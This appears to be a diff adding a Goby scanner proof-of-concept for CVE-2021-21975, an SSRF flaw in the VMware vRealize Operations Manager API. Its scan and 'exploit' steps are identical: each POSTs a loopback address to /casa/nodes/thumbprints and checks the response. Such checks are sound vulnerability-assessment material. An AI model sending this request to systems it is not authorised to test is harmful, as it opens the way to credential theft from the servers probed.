@@ -1,0 +1,126 @@
+{
+      "Name": "VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975",
+      "Level": "2",
+      "Tags": [
+            "SSRF"
+      ],
+      "GobyQuery": "app=\"Apache-Web-Server\" && title=\"vRealize Operations Manager\"",
+      "Description": "vRealize Operations Enable self-driving IT Operations Management across private, hybrid and multi-cloud environments with a unified operations platform that delivers continuous performance, capacity and cost optimization, intelligent remediation and integrated compliance through AI/ML and predictive analytics.",
+      "Product": "VMWare Operations vRealize Operations",
+      "Homepage": "https://www.vmware.com/products/vrealize-operations.html",
+      "Author": "",
+      "Impact": "Server Side Request Forgery in vRealize Operations Manager API (CVE-2021-21975) prior to 8.4 may allow a malicious actor with network access to the vRealize Operations Manager API can perform a Server Side Request Forgery attack to steal administrative credentials.",
+      "Recommendation": "",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-21975",
+            "https://www.vmware.com/security/advisories/VMSA-2021-0004.html"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/casa/nodes/thumbprints",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json;charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "[\"127.0.0.1:443\"]"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": "error_message",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "thumbprint",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "address",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/casa/nodes/thumbprints",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json;charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "[\"127.0.0.1:443\"]"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": "error_message",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "thumbprint",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "address",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
